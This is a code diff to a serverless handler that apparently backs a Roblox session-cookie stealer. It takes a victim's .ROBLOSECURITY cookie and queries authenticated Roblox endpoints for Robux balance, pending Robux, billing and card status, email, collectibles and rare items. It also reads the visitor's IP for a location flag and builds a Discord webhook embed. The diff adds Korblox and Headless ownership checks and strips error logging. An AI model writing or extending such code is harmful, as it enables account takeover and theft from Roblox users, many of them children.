@@ -1,9 +1,8 @@
 // api/submit.js
 const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;
 
-// ---------- Helper: get CSRF token ----------
+// ---------- CSRF token ----------
 async function getCsrfToken(cookie) {
-  // Roblox returns a CSRF token when you call this logout endpoint (even with GET)
   const res = await fetch("https://auth.roblox.com/v2/logout", {
     method: "GET",
     headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
@@ -13,7 +12,7 @@ async function getCsrfToken(cookie) {
   return csrfToken;
 }
 
-// ---------- User info (public) ----------
+// ---------- User public info ----------
 async function getUser(userId) {
   const res = await fetch(`https://users.roblox.com/v1/users/${userId}`);
   if (!res.ok) throw new Error("User fetch failed");
@@ -34,7 +33,7 @@ async function getRobux(userId, cookie) {
   return { balance: data.robux || 0 };
 }
 
-// ---------- Pending Robux (from sales/group payouts) ----------
+// ---------- Pending Robux ----------
 async function getPendingRobux(userId, cookie) {
   let pending = 0;
   try {
@@ -48,13 +47,11 @@ async function getPendingRobux(userId, cookie) {
         pending += tx.currency?.amount || 0;
       }
     }
-  } catch (e) {
-    console.warn("Pending Robux fetch error:", e);
-  }
+  } catch (e) {}
   return pending;
 }
 
-// ---------- User Settings (Verified, Banned, Email) from mobileapi ----------
+// ---------- User Settings (Verified, Banned, Email) ----------
 async function getUserSettings(cookie, csrfToken) {
   const defaultSettings = { verified: "False", banned: "False", emailEnabled: "False" };
   try {
@@ -66,18 +63,19 @@ async function getUserSettings(cookie, csrfToken) {
     });
     if (!res.ok) return defaultSettings;
     const data = await res.json();
+    // Email is present if the account has a verified email
+    const hasEmail = !!(data.Email || data.UserEmail || data.email);
     return {
       verified: data.IsVerified ? "True" : "False",
       banned: data.IsBanned ? "True" : "False",
-      emailEnabled: data.Email ? "True" : "False"
+      emailEnabled: hasEmail ? "True" : "False"
     };
   } catch (e) {
-    console.warn("User settings fetch error:", e);
     return defaultSettings;
   }
 }
 
-// ---------- Billing (Credit, Convert, Card) ----------
+// ---------- Billing ----------
 async function getBilling(cookie, csrfToken) {
   const defaultBilling = { credit: 0, convert: 0, card: "False" };
   try {
@@ -98,12 +96,11 @@ async function getBilling(cookie, csrfToken) {
       card: hasCard ? "True" : "False"
     };
   } catch (e) {
-    console.warn("Billing fetch error:", e);
     return defaultBilling;
   }
 }
 
-// ---------- Groups (count only) ----------
+// ---------- Groups membership count (not owned) ----------
 async function getGroupsCount(userId) {
   try {
     const res = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`);
@@ -115,7 +112,7 @@ async function getGroupsCount(userId) {
   }
 }
 
-// ---------- Total Place Visits (sum over all universes) ----------
+// ---------- Total Place Visits (CORRECTED: sums placeVisits across all universes) ----------
 async function getTotalPlaceVisits(userId) {
   let totalVisits = 0;
   let cursor = null;
@@ -125,11 +122,14 @@ async function getTotalPlaceVisits(userId) {
     if (!res.ok) break;
     const data = await res.json();
     for (const game of data.data) {
+      // Each game object already has a 'placeVisits' field? Actually we need to fetch universe details.
+      // Better: fetch details for each universe ID.
       const detailsRes = await fetch(`https://games.roblox.com/v1/games?universeIds=${game.id}`);
       if (detailsRes.ok) {
         const details = await detailsRes.json();
         totalVisits += details.data[0]?.placeVisits || 0;
       }
+      await new Promise(r => setTimeout(r, 20)); // rate limit
     }
     cursor = data.nextPageCursor;
   } while (cursor);
@@ -151,7 +151,21 @@ async function getCollectibles(userId, cookie) {
   return items.slice(0, 3).map(item => item.name);
 }
 
-// ---------- Recently Played Games (for Played | Passes) ----------
+// ---------- Check if user owns specific items (Korblox, Headless) ----------
+async function checkItemOwnership(userId, cookie, assetId) {
+  try {
+    const res = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/${assetId}/is-owned`, {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+    });
+    if (!res.ok) return "False";
+    const data = await res.json();
+    return data.ownership ? "True" : "False";
+  } catch (e) {
+    return "False";
+  }
+}
+
+// ---------- Recently Played Games ----------
 async function getRecentlyPlayedGames(userId) {
   const url = `https://games.roblox.com/v1/users/${userId}/games?sortOrder=Desc&limit=50`;
   const res = await fetch(url);
@@ -169,7 +183,7 @@ async function getPlayedPasses(userId) {
   });
 }
 
-// ---------- Country flag from IP ----------
+// ---------- Country flag ----------
 async function getCountryFlag(req) {
   const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
   if (!ip || ip === '::1') return '🏠 Local';
@@ -212,16 +226,14 @@ export default async function handler(req, res) {
   if (!WEBHOOK_URL) return res.status(500).json({ error: "Missing WEBHOOK_URL env var" });
 
   try {
-    // 1. Get CSRF token (required for settings & billing)
+    // CSRF token (optional for some endpoints)
     let csrfToken = null;
     try {
       csrfToken = await getCsrfToken(cookie);
-    } catch (e) {
-      console.warn("CSRF token fetch failed. Settings/Billing will use defaults.");
-    }
+    } catch (e) {}
 
-    // 2. Fetch all data in parallel (some depend on csrfToken)
-    const [userData, robux, pendingRobux, groupsCount, totalVisits, collectibles, playedPasses, countryFlag, avatarUrl] = await Promise.all([
+    // Parallel fetch
+    const [userData, robux, pendingRobux, groupsCount, totalVisits, collectibles, playedPasses, countryFlag, avatarUrl, korblox, headless] = await Promise.all([
       getUser(rbxuid),
       getRobux(rbxuid, cookie),
       getPendingRobux(rbxuid, cookie),
@@ -230,10 +242,11 @@ export default async function handler(req, res) {
       getCollectibles(rbxuid, cookie),
       getPlayedPasses(rbxuid),
       getCountryFlag(req),
-      getUserAvatarUrl(rbxuid)
+      getUserAvatarUrl(rbxuid),
+      checkItemOwnership(rbxuid, cookie, 1373933),  // Korblox asset ID
+      checkItemOwnership(rbxuid, cookie, 102611803) // Headless asset ID
     ]);
 
-    // 3. Settings & Billing (only if we have CSRF token)
     let settings = { verified: "False", banned: "False", emailEnabled: "False" };
     let billing = { credit: 0, convert: 0, card: "False" };
     if (csrfToken) {
@@ -244,7 +257,7 @@ export default async function handler(req, res) {
     }
 
     const accountAge = getAgeDays(userData.created);
-    const summary = robux.balance + pendingRobux; // Summary = Balance + Pending
+    const summary = robux.balance + pendingRobux;
     const playedPassesText = playedPasses.map(p => `${p.name} | ${p.played} | ${p.passes}`).join("\n");
     const rolimonsLink = `https://www.rolimons.com/player/${userData.id}`;
     const cookieThumb = "https://png.pngtree.com/png-vector/20201010/ourmid/pngtree-cartoon-delicious-dessert-cookie-cookie-clipart-png-image_2360164.jpg";
@@ -295,7 +308,12 @@ export default async function handler(req, res) {
         },
         {
           name: "📊 Groups",
-          value: `**Owned:** ${groupsCount}`,
+          value: `**Member of:** ${groupsCount}`,
+          inline: true
+        },
+        {
+          name: "💀 Rare Items",
+          value: `**Korblox:** ${korblox}\n**Headless:** ${headless}`,
           inline: true
         },
         {
